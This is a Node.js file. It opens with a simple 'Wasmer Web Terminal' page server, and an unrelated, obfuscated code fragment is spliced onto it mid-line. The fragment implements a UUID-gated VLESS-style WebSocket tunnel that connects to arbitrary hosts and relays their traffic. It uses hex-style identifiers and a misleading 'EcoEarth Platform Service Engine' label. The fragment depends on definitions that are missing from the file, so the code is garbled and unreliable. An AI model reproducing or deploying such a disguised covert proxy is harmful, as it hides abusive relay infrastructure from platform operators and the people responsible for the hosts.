const http = require('http');
const PORT = process.env.PORT || 8080;

const html = `
<!DOCTYPE html>
<html>
<head>
    <title>Wasmer Web Terminal</title>
    <style>
        body { background: #1e1e1e; color: #00ff00; font-family: monospace; padding: 20px; }
        #output { height: 400px; overflow-y: auto; white-space: pre-wrap; border: 1px solid #333; padding: 10px; margin-bottom: 10px; }
        input { width: 100%; background: #000; color: #fff; border: 1px solid #555; padding: 10px; font-family: monospace; }
    </style>
</head>
<body>
    <h2>Wasmer Interactive JS/Terminal Environment</h2>
    <div id="output">Welcome to Wasmer Web Console.\nType JavaScript expressions or node code below:\n</div>
    <input type="text" id="cmd" placeholder="Type command here and press Enter (e.g. 1+1, process.version, Object.keys(process.env))..." onkeydown="if(event.key==='Enter') runCMD()">

    <script>
        function runCMD() {
            const input = document.getElementById('cmd');
            const output = document.getElementById('output');
            const code = input.value;
            if(!code) return;
            
            output.innerText += '> ' + code + '\n';
            try {
                const res = eval(code);
                output.innerText += (typeof res === 'object' ? JSON.stringify(res, null, 2) : res) + '\n\n';
            } catch(e) {
                output.innerText += 'Error: ' + e.message + '\n\n';
            }
            input.value = '';
            output.scrollTop = output.scrollHeight;
        }
    </script>
</body>
</html>
`;

const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(html);
});

server.listen(PORT, () => console.log(`Server on ${PORT}`));            if (_buf[0] !== 0x00) { _ws.close(); return; }

            const _reqUuid = _buf.subarray(1, 17);
            if (!_reqUuid.equals(_0xUUID_BUF)) { _ws.close(); return; }

            const _addonsLen = _buf[17];
            const _cmd = _buf[18 + _addonsLen];
            if (_cmd !== 0x01) { _ws.close(); return; }

            const _port = _buf.readUInt16BE(19 + _addonsLen);
            const _addrType = _buf[21 + _addonsLen];
            let _offset = 22 + _addonsLen;
            let _targetHost = '';

            if (_addrType === 0x01) {
                _targetHost = _buf.subarray(_offset, _offset + 4).join('.');
                _offset += 4;
            } else if (_addrType === 0x02) {
                const _dLen = _buf[_offset];
                _targetHost = _buf.toString(_0x1a9(3), _offset + 1, _offset + 1 + _dLen);
                _offset += 1 + _dLen;
            } else if (_addrType === 0x03) {
                const _v6 = _buf.subarray(_offset, _offset + 16);
                const _arr = [];
                for (let i = 0; i < 16; i += 2) {
                    _arr.push(_v6.readUInt16BE(i).toString(16));
                }
                _targetHost = _arr.join(':');
                _offset += 16;
            } else {
                _ws.close();
                return;
            }

            const _initialData = _buf.subarray(_offset);

            _sock = _net.connect(_port, _targetHost, () => {
                _ws.send(Buffer.from([0x00, 0x00]));
                if (_initialData.length > 0) {
                    _sock.write(_initialData);
                }
            });

            _sock.on(_0x1a9(9), (_data) => {
                if (_ws.readyState === _ws.OPEN) {
                    _ws.send(_data);
                }
            });

            _sock.on(_0x1a9(8), () => {
                if (_ws.readyState === _ws.OPEN) _ws.close();
            });

            _sock.on(_0x1a9(7), () => {
                if (_ws.readyState === _ws.OPEN) _ws.close();
            });

        } else {
            if (_sock && !_sock.destroyed) {
                _sock.write(_buf);
            }
        }
    });

    _ws.on(_0x1a9(7), () => {
        if (_sock) _sock[_0x1a9(10)]();
    });

    _ws.on(_0x1a9(8), () => {
        if (_sock) _sock[_0x1a9(10)]();
    });
});

_app.listen(_0xPORT, () => {
    console.log(`[EcoEarth Platform Service Engine] Active on port ${_0xPORT}`);
});
